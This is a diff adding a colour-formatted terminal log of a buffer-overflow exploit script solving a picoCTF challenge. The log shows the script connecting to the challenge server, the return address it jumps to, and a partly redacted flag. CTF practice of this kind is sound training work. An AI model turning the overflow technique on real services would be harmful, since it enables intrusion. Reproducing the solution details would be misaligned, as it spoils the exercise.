@@ -1,0 +1,7 @@
+<span style="color:#DC3958">$</span> python3 buffer-overflow-1.py
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<span style="color:#277FFF"><b>*</b></span>] Please enter your string: 
+[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (100B)
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port <span style="color:#696969"><b>[PORT]</b></span>
+[<span style="color:#47D4B9"><b>+</b></span>] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+    picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}
